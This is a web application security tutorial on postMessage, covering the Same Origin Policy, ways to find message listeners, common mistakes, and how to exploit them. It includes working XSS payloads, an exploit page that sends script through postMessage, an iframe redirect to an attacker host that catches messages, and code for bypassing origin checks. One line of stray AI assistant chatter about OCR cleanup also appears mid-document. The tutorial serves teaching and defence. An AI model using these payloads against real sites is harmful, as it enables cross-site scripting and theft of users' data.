# PostMessage Security

## The relation between the Same-Origin Policy (SOP) and the JavaScript method `postMessage()`

{% embed url="https://sallam.gitbook.io/sec-88/web-appsec/cors/same-origin-policy-sop" %}

Web browsers enforce a security measure known as the **Same Origin Policy (SOP)** to prevent websites from interfering with each other. This policy is crucial in safeguarding user data across the web.

Consider a scenario where you, as an attacker, have created a phishing page. On this page, you craft a GET request to `https://examplebank.com/userAccount/getAccountInformation.aspx`. Now, imagine that a victim, who is already logged into their account at this bank, visits your phishing page. By default, the browser includes the user's cookies in any request made to the bank's website. This means that, since the victim is logged in, the request to `getAccountInformation.aspx` will return the user's account information in the response.

If the Same Origin Policy didn't exist, the attacker could easily exploit this behavior. By loading the `getAccountInformation.aspx` page in an invisible iframe within the victim's browser, the attacker could read the sensitive data returned in the response. This would allow them to steal the victim's account information without detection.

However, the Same Origin Policy acts as a security guideline that instructs the browser on which origins it allows to be read or modified by JavaScript. According to PortSwigger, the same-origin policy restricts scripts on one origin from accessing data from another origin. An **origin** is defined by a combination of the URI scheme, domain, and port number. For example, consider the following URL:

```
http://normal-website.com:8080/example/example.html
```

In this case:

* **Scheme:** `http`
* **Domain (including subdomain):** `normal-website.com`
* **Port number:** `8080`

These three components collectively form the origin for this page. For any other URI to be considered as coming from the same origin, all three components must match exactly. The Same Origin Policy ensures that no page from a different origin can read or modify the contents of this page, and vice versa.

With an understanding of the Same Origin Policy, it becomes clear why mechanisms like **postMessage** were introduced. These allow for controlled, secure communication between different origins when necessary.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## The JavaScript postMessage() function

The JavaScript `postMessage()` function enables secure cross-origin communication between windows, such as a parent window and an iframe or a popup. This is especially useful when a web application needs to embed an iframe or open a new window, like a third-party contact form, and the parent and child windows have different origins. The Same Origin Policy (SOP) restricts communication between these windows, but `postMessage()` allows them to exchange data securely without generating an HTTP request.

### **Syntax of `postMessage()`  ->** Sending Windo&#x77;**:**

```javascript
postMessage(message, targetOrigin, transfer);
```

* **message:** The data to be sent. It can be any JavaScript data type.
* **targetOrigin:** Specifies the origin that the message is intended for. This should be a specific origin for security reasons, though a wildcard `*` can be used to send the message to any origin.
* **transfer:** (Optional) A sequence of Transferable Objects. These are transferred with the message but are not copied.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Syntax of `postMessage()`  ->** Recieving Windo&#x77;**:**

```javascript
window.addEventListener("message", function(event) {
  // Access the message data using event.data
  console.log("Received message:", event.data);

  // Additional processing can be done here
  // event.origin can be used to validate the source of the message
  // event.source can be used to post a response back to the source window
}, false); // 'false' specifies that the event should be handled in the bubbling phase
```

#### Explanation:

* **`"message"`**: The event type you want to listen for. In this case, it's the `"message"` event, which is triggered when a message is received from another window or frame.
* **`function(event)`**: A callback function that is executed when the `"message"` event is fired. The `event` object contains information about the message, such as:
  * **`event.data`**: The data sent from the source window.
  * **`event.origin`**: The origin of the message, which can be used to verify the message's source.
  * **`event.source`**: A reference to the window that sent the message, which can be used to send a response back.
* **`false/true`**: The optional `useCapture` parameter. If `false`, the event is handled in the bubbling phase (default). If `true`, the event is handled in the capturing phase.

#### Example:

```javascript
window.addEventListener("message", function(event) {
  // Validate the origin of the message
  if (event.origin !== "https://trusted-domain.com") {
    return;
  }

  // Handle the received message
  console.log("Message received from:", event.origin);
  console.log("Message data:", event.data);

  // Example: Send a response back to the source window
  event.source.postMessage("Message received", event.origin);
}, false);
```

In this example, the message is only processed if it comes from a trusted origin (`https://trusted-domain.com`). This helps prevent malicious attacks such as Cross-Origin Communication attacks.

## Enumeration

Detecting vulnerabilities related to `postMessage()` is not always straightforward. It requires a solid understanding of JavaScript and the ability to analyze the target application’s JavaScript code to identify potential attack vectors. Tracing the execution flow is crucial for performing a successful attack.

To exploit `postMessage()` vulnerabilities, you must first determine whether the target application utilizes web messaging. If it does, identifying the various listeners is critical. There are several methods to accomplish this, including:

1. **Searching for Keywords:**
   * Use the developer tool’s global search feature to look for specific keywords like `postMessage()`, `addEventListener("message")`, or `.on("message")` in the JavaScript files. This can help pinpoint where the application is using `postMessage()`.
2. **Using the MessPostage Browser Extension:**
   * MessPostage is a browser extension that simplifies detecting the use of `postMessage()` APIs in an application. It highlights which messages were sent and where event listeners were added, making it easier to trace messaging activity.
3.  **Using Developer Tools:**

    * The "Global Listener" feature in the "Sources" pane of Developer Tools can be used to identify the use of `postMessage()`. By opening the Global Listener and clicking on "messages," you can view the message handlers that have been set up.

    <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
4. **Using Posta:**
   * Posta is a tool designed for researching Cross-document Messaging communication. It allows you to track, explore, and exploit `postMessage()` vulnerabilities. Posta includes features like replaying messages sent between windows in any attached browser, providing valuable insights into the communication flow.
5. **Using PMHook:**
   * PMHook is a client-side JavaScript library that can be used with TamperMonkey in the Chrome web browser. It executes immediately at page load and wraps the `EventTarget.addEventListener` method, logging any subsequent message event handlers as they are added. Additionally, it wraps the event handler functions to log the messages received by each handler.

## Common Pitfalls

While `postMessage()` is a secure way to circumvent SOP, improper use can introduce vulnerabilities. Here are some common pitfalls:

1. **Wildcard `targetOrigin`:**

Developers sometimes use `*` as the `targetOrigin`, allowing any origin to access the message. This is dangerous, especially if the message contains sensitive data. For example, if `https://somewebsite.com` embeds an iframe from `http://sub.somewebsite.com` and sends a postMessage with `targetOrigin` as `*`, an attacker can exploit this by changing the location of the iframe to their domain, intercepting the message.

**Example:**

```javascript
parentWindow.postMessage({"user_email":"admin@bugbase.in"},"*");
```

An attacker can host a malicious webpage that changes the location of the iframe loaded by `https://somewebsite.com` to `http://attacker.com` using a simple script:

```html
<iframe src="https://somewebsite.com"></iframe>
<script>
    setTimeout(() => {
        window.frames[0].location = "https://attacker.com/exploit.html";
    }, 6000);
</script>
```

The message intended for `somewebsite.com` will now be sent to the attacker's domain.

**2. Insufficient/Lacking Origin Check:**

On the receiving side, the message event listener should validate the origin of the message before processing it. Failure to do so can lead to vulnerabilities such as Cross-Site Scripting (XSS).

**Example:**

```javascript
window.addEventListener('message', function (event) {
    if (event.origin !== "http://legitimatesite.org:8080")
        return;
    // Perform some action
}, false);
```

If the origin is not properly validated, an attacker could send a message containing an XSS payload that alters the page's content or steals sensitive data.

**Insecure Example:**

```javascript
window.addEventListener('message', function (event) {
    const data = JSON.parse(event.data);
    const accountDiv = document.getElementById("account-div");
    accountDiv.innerHTML = data.message;
});
```

This example lacks validation, allowing an attacker to inject malicious code.

## Exploiting `postMessage()`

### **DOM BASED XSS USING INSECURE POSTMESSAGE():**

HTML5 postMessage introduces a new taint source in the form of the message payload (Event.data). A DOM-based Cross-Site Scripting (XSS) vulnerability occurs when the payload of a message event is handled in an unsafe way. The table below lists some of the most common functions and attributes that can lead to an XSS vulnerability.

The OCR extraction wasn't perfect, but I can clean it up and reconstruct the table for you:

<table data-header-hidden data-full-width="false"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Function</strong></td><td><strong>Description</strong></td></tr><tr><td><code>document.write({taint})</code></td><td>The <code>document.write</code> function writes the passed-in string to the page, including any embedded script code. To exploit this function, the attacker simply embeds script code within the tainted input.</td></tr><tr><td><code>document.writeln({taint})</code></td><td>Same as <code>document.write</code>, but writes a line break after the content.</td></tr><tr><td><code>element.innerHTML = {taint}</code></td><td>Similar to <code>document.write</code>, setting the <code>innerHTML</code> or <code>outerHTML</code> attributes with a tainted value can be exploited by embedding malicious script code within the assigned value.</td></tr><tr><td><code>element.outerHTML = {taint}</code></td><td>Similar to <code>innerHTML</code>, this can also be exploited in the same manner as described above.</td></tr><tr><td><code>location = {taint}</code></td><td>Changing the page location could be exploited to perform an XSS attack by passing a <code>JavaScript:</code> or <code>data:</code> protocol handler as the value. For example: <code>location = "JavaScript:alert('xss')"</code> or <code>location = "data:text/html,&#x3C;script>alert(document.cookie)&#x3C;/script>"</code>.</td></tr><tr><td><code>location.href = {taint}</code></td><td>Similar to <code>location = {taint}</code>, this can also lead to XSS when assigning a tainted value containing a <code>JavaScript:</code> or <code>data:</code> protocol.</td></tr><tr><td><code>window.open({taint})</code></td><td>Exploits similar to those with <code>location</code> can be executed by opening a new window with tainted input containing a <code>JavaScript:</code> or <code>data:</code> protocol.</td></tr><tr><td><code>location.replace({taint})</code></td><td>Similar to <code>location = {taint}</code>, this can also be used for XSS when replacing the current URL with a tainted one.</td></tr><tr><td><code>$({taint})</code></td><td>Markup passed directly to a jQuery selector is immediately evaluated, and any embedded JavaScript event handlers are executed. For example: <code>$("svg onload='alert(123)'>")</code> would execute <code>alert(123)</code>.</td></tr><tr><td><code>eval({taint})</code></td><td>Data passed to the <code>eval()</code> function is evaluated as JavaScript, so if the attacker can control the data passed to this function, it is possible to perform XSS.</td></tr><tr><td><p><code>ScriptElement.src ScriptElement.text</code></p><p><code>ScriptElement.textContent ScriptElement.innerText</code></p></td><td>Setting the “<code>src</code>” attribute of a script element allows a script to be loaded from an attacker controller server. Setting the text, <code>textContent</code> or <code>innerText</code> allows the script content to be modified.</td></tr><tr><td><code>href</code>, <code>src</code> attribute of various elements.</td><td>Many elements that support either a “href” or “src” attribute can be exploited to perform an XSS attack by setting a JavaScript: or Data: URI. Some examples include; SCRIPT, EMBED, OBJECT, A and IFRAME, however this is not an exhaustive list and new elements are introduced over time.</td></tr></tbody></table>

### Exploiting `postMessage()` Using `iframe`

In this scenario, we'll explore how a vulnerability in the `postMessage()` implementation can be exploited using an `iframe`. The scenario involves a lab environment with a vulnerable Node.js application.

**Application Flow**

1.  **Change Password Functionality:**

    * The application has a "Change Password" feature that, when clicked, opens a child window for the user to update their password.

    <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
2.  **Password Update Process:**

    * The user enters the new password and confirmation, then clicks "Save."
    * Upon saving, a message is displayed on the parent window indicating that the password was updated successfully.

    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
3.  **Event Listener in the Parent Window:**

    * The parent window contains an `addEventListener` that listens for the `message` event. This event is triggered whenever the parent window receives a message.
    * The event listener function updates the HTML content of an element with `id="displayMessage"` upon receiving a message.

    <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
4.  **Source Code of the Child Window:**

    * The child window sends an XHR request to update the password. Upon success, the server responds with a `200` status code and the message "Password update Successfull!".
    * The response is passed to the `sendMessage` function.
    * The `sendMessage` function uses `postMessage()` to send the success message to the parent window, identifying the parent via `window.opener`.

    <figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Vulnerability Analysis**

*   **Improper Origin Validation:**

    * The `postMessage()` method allows specifying the target origin. However, if the origin is not specified and a wildcard (`*`) is used instead, the message could be intercepted or sent to any site.
    * In the vulnerable implementation, the parent window listens for messages but does not validate the origin of the incoming message, making it susceptible to attacks.

    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Exploitation Process**

1. **Understanding the Vulnerable Code:**
   * The parent window is listening for messages, but without verifying the sender's origin. This opens up the possibility of an attacker sending malicious data to the parent window.
2.  **Secure Implementation:**

    * A secure implementation would involve verifying the origin of the sender by comparing it with an acceptable origin. This prevents unauthorized messages from being processed.

    <figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
3. **Exploit Development:**
   * **HTML Structure:**
     * Create an HTML page with a submit button.
     * Load the vulnerable application in an `iframe`.
   * **Exploit Function:**
     * Define a `payload` containing the malicious JavaScript code.
     * Use the `contentWindow` property to access the `iframe`'s window object.
     * Send the payload to the `iframe` using `postMessage()`.

```html
vulnerable<!DOCTYPE html>
<html>
<head>
    <title>PostMessage Exploit</title>
</head>
<body>
    <h1>Exploit PostMessage Vulnerability</h1>
    <iframe id="targetFrame" src="https://vulnerable-nodejs-app.com" style="display:none;"></iframe>
    <button onclick="exploit()">Click to Exploit</button>

    <script>
        function exploit() {
            // Malicious payload
            var payload = "<script>alert('XSS via postMessage')</script>";

            // Accessing the iframe's content window
            var iframe = document.getElementById('targetFrame').contentWindow;

            // Sending the payload to the iframe
            iframe.postMessage(payload, "*");
        }
    </script>
</body>
</html>
```

* **Explanation:**
  * **Line 7:** The `payload` contains a malicious script designed to trigger an XSS attack.
  * **Line 8:** The `contentWindow` property allows access to the `iframe`'s window object, enabling manipulation of its DOM.
  * **Line 9:** The `postMessage()` method sends the malicious payload to the `iframe`, exploiting the lack of origin validation.

1. **Deploy the Exploit:**
   * Load the exploit page in a browser and click on the "Click to Exploit" button.
2. **Result:**
   * The XSS payload is executed in the context of the vulnerable application, demonstrating a successful attack.

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Bypassing Origin Checks:**

*   **Using `indexOf`:**

    ```javascript
    window.addEventListener('message', function (e) {
        if (e.origin.indexOf("https://legitimate.com") === -1) {
            // Deny
        } else {
            // Allow
        }
    });
    ```

    This check can be bypassed by registering a subdomain like `https://legitimate.com.attacker.site`.
*   **Using `String.search`:**

    ```javascript
    window.addEventListener('message', function (e) {
        if ("https://legitimatesite.com".search(e.origin) === -1) {
            // Deny
        } else {
            // Allow
        }
    });
    ```

    Bypass this by using a domain like `legit.matesite.com`, where the `.` will match any character due to the regex conversion, allowing it to match `legitimatesite.com`.
*   **Bypassing `e.origin === window.origin`:**

    ```javascript
    let f = document.createElement('iframe');
    f.sandbox = 'allow-scripts allow-popups allow-top-navigation';
    f.srcdoc = `
    let w = open('https://so-xss.terjanq.me/iframe.php');
    setTimeout(_ => {
        w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*');
    }, 1000);
    `;
    ```

    This sets `e.origin` and `window.origin` to `null`, bypassing the check.

## **X-Frame-Header Bypass:**

Some headers like `X-Frame-Options` prevent a webpage from being iframed. To bypass this, you can open a new tab to the vulnerable web application and communicate with it:

```javascript
var w = window.open("<url>");
setTimeout(function(){ w.postMessage('...', '*'); }, 2000);
```

## BYPASS REGEX BASED VALIDATION

### WILDCARD DOTS

**Vulnerable Code**

```javascript
function receiveMessage(event){
    // Match on mail.google.com and www.google.com
    var regex = /^https*:\/\/(mail|www).google.com$/i;
    // Test message origin for a match
    if (!regex.test(event.origin)){
        return;// Return if no match
    }
    // process message payload
}
```

In a real-world scenario, a developer intended to allow multiple hostnames (`http(s)://mail.google.com` and `http(s)://www.google.com`) using a regular expression:

```javascript
var regex = /^https*:\/\/(mail|www).google.com$/i;
```

**Issue:** The use of unescaped dots (`.`) in the regex, specifically in `".google.com"`, creates a vulnerability. In regular expressions, a dot (`.`) matches any character, allowing unintended URLs like `http://mailXgoogle.com` to pass the validation.

This issue can also occur when regexes are automatically generated based on the current page location, as seen in `www.facebook.com`:

```javascript
RegExp('^'+window.location.protocol+'//'+window.location.host+'$')
```

This generates:

```javascript
/^https:\/\/www.facebook.com$/
```

Unescaped dots in regex-based validation can lead to security flaws by matching unintended URLs, potentially allowing malicious origins.

### OTHER COMMON REGEX FLAWS

Another frequent error in regular expressions is failing to denote the end of the matched value using the `$` symbol. Consider the following regular expression:

```javascript
var regex = /^https*:\/\/(mail|www)\.google\.com/i;
```

**Issue:** While the dots (`.`) are correctly escaped, the pattern lacks a `$` at the end, meaning it doesn't enforce that the match must end exactly at `.google.com`. As a result, any domain that starts with the matched value is accepted, such as `https://www.google.com.sec-1.com`.

**Example:** This is a common validation mistake, and tools like the PMHook replay tool exploit this by dynamically generating hostnames. For instance, if a message originally came from `https://www.google.com`, the replay tool might open it at `https://www.google.com.sentinel.appcheckng.com/`, potentially bypassing flawed regex validation.

**Conclusion:** Always use the `$` symbol in regular expressions to ensure that the match ends exactly where intended, preventing acceptance of unintended domains.

## References

* [PortSwigger Web Security Academy: Same Origin Policy](https://portswigger.net/web-security/cors/same-origin-policy)
* [Medium: Exploiting postMessage](https://medium.com/@chiragrai3666/exploiting-postmessage-e2b01349c205)
* [https://docs.ioin.in/writeup/www.exploit-db.com/\_docs\_40287\_pdf/index.pdf](https://docs.ioin.in/writeup/www.exploit-db.com/_docs_40287_pdf/index.pdf)
* [https://www.youtube.com/watch?v=rbHC3DHk6Vg](https://www.youtube.com/watch?v=rbHC3DHk6Vg)

{% embed url="https://payatu.com/blog/postmessage-vulnerabilities/" %}

{% embed url="https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities#attacking-iframe-and-wildcard-in-targetorigin" %}

{% embed url="https://bugbase.ai/blog/exploiting-post-message-vulnerabilities-for-fun-and-profit" %}
